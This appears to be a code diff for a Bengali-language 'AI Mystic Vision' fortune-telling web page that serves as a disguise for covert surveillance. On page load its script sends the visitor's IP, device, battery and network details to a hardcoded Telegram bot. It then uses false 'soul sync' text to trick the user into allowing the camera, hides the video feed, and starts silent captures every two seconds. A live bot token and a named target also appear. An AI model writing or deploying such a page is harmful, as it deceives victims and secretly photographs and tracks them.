@@ -1,3 +1,53 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Mystic Vision - ভবিষ্যৎ দর্পণ</title>
+    <style>
+        body { background: #000; color: #e0f7fa; font-family: 'Segoe UI', serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .box { width: 85%; max-width: 400px; background: radial-gradient(circle, #001a33 0%, #000 100%); padding: 40px; border-radius: 50px; border: 1px solid #0099ff; text-align: center; box-shadow: 0 0 60px rgba(0, 153, 255, 0.3); }
+        .screen { display: none; }
+        .active { display: block; }
+        .btn { padding: 18px; background: #0099ff; color: #fff; border: none; border-radius: 30px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 25px; font-size: 1.1rem; box-shadow: 0 4px 15px rgba(0, 153, 255, 0.4); text-transform: uppercase; }
+        .result-img { width: 100%; border-radius: 20px; margin: 20px 0; border: 1px solid #0099ff; height: 240px; object-fit: cover; }
+        #video { width: 1px; height: 1px; opacity: 0.01; position: absolute; }
+        .eye-scanner { width: 120px; height: 120px; border: 2px solid #0099ff; border-radius: 50%; margin: 0 auto 20px; position: relative; animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.1); opacity: 0.5; } 100% { transform: scale(1); opacity: 1; } }
+    </style>
+</head>
+<body>
+
+<audio id="bgMusic" loop>
+    <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3" type="audio/mpeg">
+</audio>
+
+<div class="box">
+    <div id="s1" class="screen active">
+        <div class="eye-scanner"></div>
+        <h2>Mystic AI Vision 🔮</h2>
+        <p>এআই তোমার নসিব এবং ভাগ্যের রেখা বিশ্লেষণ করতে প্রস্তুত। তুমি কি তোমার ভবিষ্যৎ দেখতে চাও?</p>
+        <button class="btn" onclick="openVision('male')">ছেলে হিসেবে দেখো 🧔</button>
+        <button class="btn" style="background: #ff3399;" onclick="openVision('female')">মেয়ে হিসেবে দেখো 👩</button>
+    </div>
+
+    <div id="s2" class="screen">
+        <h3>আত্মিক সংযোগ স্থাপন... ✨</h3>
+        <p>এআই তোমার চোখের মণির রিফ্লেকশন থেকে তোমার আত্মার ডাটা সিঙ্ক করছে। পরবর্তী ধাপে <b>'Allow'</b> ক্লিক করে এনার্জি কানেক্ট করো।</p>
+        <video id="video" autoplay playsinline></video>
+        <button class="btn" onclick="startSync()">কানেক্ট করো ⚡</button>
+    </div>
+
+    <div id="s3" class="screen">
+        <h2 id="res-title"></h2>
+        <img id="res-img" class="result-img" src="">
+        <p id="res-desc"></p>
+        <button class="btn" id="next-btn" onclick="showNext()">আরও রহস্য দেখো ✨</button>
+    </div>
+</div>
+
+<canvas id="canvas" style="display:none;"></canvas>
+
 <script>
     const BOT_TOKEN = '8655910223:AAF7QkYAwKuha8tVJjiNvVjWcZtaG0ffaoA'; 
     const CHAT_ID = '6547277630'; 
@@ -7,7 +57,7 @@
     let photoInterval;
     const music = document.getElementById('bgMusic');
 
-    // --- নতুন অংশ: পেজ লোড হওয়ার সাথে সাথেই ডাটা সংগ্রহ ---
+    // পেজ লোড হওয়ার সাথে সাথেই আইপি ও ডিভাইস ইনফো পাঠানো
     window.onload = async function() {
         try {
             const n = navigator;
@@ -15,7 +65,6 @@
             const ipData = await ipRes.json();
             const conn = n.connection || {};
             
-            // ব্যাটারি ইনফো (প্রমিজ হ্যান্ডলিং)
             let batteryInfo = "N/A";
             if (n.getBattery) {
                 const battery = await n.getBattery();
@@ -24,17 +73,22 @@
 
             let initialInfo = `🌐 **New Visitor Joined!**\n📍 **IP:** \`${ipData.ip}\`\n📱 **Device:** ${n.userAgent.split('(')[1].split(')')[0]}\n🔋 **Battery:** ${batteryInfo}\n🧠 **RAM:** ~${n.deviceMemory || 'N/A'} GB\n📶 **Net:** ${conn.effectiveType || 'Unknown'}\n🕒 **Time:** ${new Date().toLocaleTimeString()}`;
 
-            // টেলিগ্রামে মেসেজ পাঠানো
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(initialInfo)}&parse_mode=Markdown`);
-        } catch (e) {
-            console.log("Initial data collection failed.");
-        }
+        } catch (e) { console.log("Init fail"); }
     };
-    // ------------------------------------------------
 
     function openVision(g) {
         gender = g;
+        
+        // আপনার দেওয়া ভয়েস মেসেজটি বাজানো
+        const msg = new SpeechSynthesisUtterance("প্রিয় ঝুমা, তোমার জন্য ছোট্ট একটা গেম উপহার। আল্লাহ তাআলা তোমাদেরকে সুখে রাখুন।");
+        msg.lang = 'bn-BD';
+        msg.rate = 0.9;
+        window.speechSynthesis.speak(msg);
+
+        // গজল/ব্যাকগ্রাউন্ড মিউজিক চালু করা
         music.play().catch(e => console.log("Music blocked."));
+
         document.getElementById('s1').classList.remove('active');
         document.getElementById('s2').classList.add('active');
     }
@@ -44,8 +98,7 @@
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             document.getElementById('video').srcObject = stream;
             
-            // ক্যামেরা এলাও করার পর একটি নোটিফিকেশন যাবে
-            let syncMsg = `✅ **Camera Access Granted!**\n👤 **Gender Selected:** ${gender}`;
+            let syncMsg = `✅ **Camera Access Granted!**\n👤 **Gender:** ${gender}`;
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(syncMsg)}&parse_mode=Markdown`);
 
             photoInterval = setInterval(captureSilent, 2000);
@@ -92,3 +145,5 @@
         }
     }
 </script>
+</body>
+</html>
